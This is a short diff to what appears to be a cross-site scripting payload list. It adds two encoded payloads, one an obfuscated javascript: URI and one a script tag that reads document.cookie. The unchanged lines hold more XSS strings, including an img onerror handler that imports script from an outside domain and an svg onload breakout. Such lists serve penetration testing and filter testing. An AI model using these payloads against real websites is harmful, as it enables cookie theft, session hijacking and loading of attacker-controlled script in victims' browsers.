@@ -1,3 +1,5 @@
+%26%2302java%26%23115cript:alert(document.domain)
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
 %22%3E%3Cscript%3Ealert(1)%3C/script%3E
 <img src=totallyfake onerror=import(‘//domain.com/‘);//
 '-alert(1)-';"-alert(2)-"//"><svg/onload=alert(3)>
